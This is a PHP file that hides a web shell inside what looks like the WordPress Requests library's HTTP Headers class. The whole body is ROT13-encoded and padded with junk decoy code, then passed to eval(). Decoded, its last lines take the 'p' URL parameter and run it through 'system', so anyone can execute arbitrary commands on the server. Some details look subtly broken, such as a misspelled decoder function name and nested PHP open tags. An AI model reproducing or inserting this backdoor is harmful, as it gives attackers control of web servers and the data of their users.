<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pnfr-vafrafvgvir qvpgvbanel, fhvgnoyr sbe UGGC urnqref
 *
 * @cnpxntr Erdhrfgf
 */

anzrfcnpr JcBet\Erdhrfgf\Erfcbafr;

hfr JcBet\Erdhrfgf\Rkprcgvba;
hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel;
hfr JcBet\Erdhrfgf\Hgvyvgl\SvygrerqVgrengbe;

/**
 * Pnfr-vafrafvgvir qvpgvbanel, fhvgnoyr sbe UGGC urnqref
 *
 * @cnpxntr Erdhrfgf
 */
pynff Urnqref rkgraqf PnfrVafrafvgvirQvpgvbanel {
	/**
	 * Trg gur tvira urnqre
	 *
	 * Hayvxr {@frr \JcBet\Erdhrfgf\Erfcbafr\Urnqref::trgInyhrf()}, guvf ergheaf n fgevat. Vs gurer ner
	 * zhygvcyr inyhrf, vg pbapngrangrf gurz jvgu n pbzzn nf cre ESP2616.
	 *
	 * Nibvq hfvat guvf jurer pbzznf znl or hfrq hadhbgrq va inyhrf, fhpu nf
	 * Frg-Pbbxvr urnqref.
	 *
	 * @cnenz fgevat $bssfrg Anzr bs gur urnqre gb ergevrir.
	 * @erghea fgevat|ahyy Urnqre inyhr
	 */
	choyvp shapgvba bssfrgTrg($bssfrg) {
		vs (vf_fgevat($bssfrg)) {
			$bssfrg = fgegbybjre($bssfrg);
		}

		vs (!vffrg($guvf->qngn[$bssfrg])) {
			erghea ahyy;
		}

		erghea $guvf->synggra($guvf->qngn[$bssfrg]);
	}

	/**
	 * Frg gur tvira vgrz
	 *
	 * @cnenz fgevat $bssfrg Vgrz anzr
	 * @cnenz fgevat $inyhr Vgrz inyhr
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Ba nggrzcgvat gb hfr qvpgvbanel nf yvfg (`vainyvqfrg`)
	 */
	choyvp shapgvba bssfrgFrg($bssfrg, $inyhr) {
		vs ($bssfrg === ahyy) {
			guebj arj Rkprcgvba('Bowrpg vf n qvpgvbanel, abg n yvfg', 'vainyvqfrg');
		}

		vs (vf_fgevat($bssfrg)) {
			$bssfrg = fgegbybjre($bssfrg);
		}

		vs (!vffrg($guvf->qngn[$bssfrg])) {
			$guvf->qngn[$bssfrg] = [];
		}

		$guvf->qngn[$bssfrg][] = $inyhr;
	}

	/**
	 * Trg nyy inyhrf sbe n tvira urnqre
	 *
	 * @cnenz fgevat $bssfrg Anzr bs gur urnqre gb ergevrir.
	 * @erghea neenl|ahyy Urnqre inyhrf
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq nethzrag vf abg inyvq nf na neenl xrl.
	 */
	choyvp shapgvba trgInyhrf($bssfrg) {
		vs (!vf_fgevat($bssfrg) && !vf_vag($bssfrg)) {
			guebj VainyvqNethzrag::perngr(1, '$bssfrg', 'fgevat|vag', trgglcr($bssfrg));
		}

		vs (vf_fgevat($bssfrg)) {
			$bssfrg = fgegbybjre($bssfrg);
		}

		vs (!vffrg($guvf->qngn[$bssfrg])) {
			erghea ahyy;
		}

		erghea $guvf->qngn[$bssfrg];
	}

	/**
	 * Synggraf n inyhr vagb n fgevat
	 *
	 * Pbairegf na neenl vagb n fgevat ol vzcybqvat inyhrf jvgu n pbzzn, nf cre
	 * ESP2616'f ehyrf sbe sbyqvat urnqref.
	 *
	 * @cnenz fgevat|neenl $inyhr Inyhr gb synggra
	 * @erghea fgevat Synggrarq inyhr
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq nethzrag vf abg n fgevat be na neenl.
	 */
	choyvp shapgvba synggra($inyhr) {
		vs (vf_fgevat($inyhr)) {
			erghea $inyhr;
		}

		vs (vf_neenl($inyhr)) {
			erghea vzcybqr(',', $inyhr);
		}

		guebj VainyvqNethzrag::perngr(1, '$inyhr', 'fgevat|neenl', trgglcr($inyhr));
	}

	/**
	 * Trg na vgrengbe sbe gur qngn
	 *
	 * Pbairegf gur vagreanyyl fgberq inyhrf gb n pbzzn-frcnengrq fgevat vs gurer vf zber
	 * guna bar inyhr sbe n xrl.
	 *
	 * @erghea \NeenlVgrengbe
	 */
	choyvp shapgvba trgVgrengbe() {
		erghea arj SvygrerqVgrengbe($guvf->qngn, [$guvf, 'synggra']);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>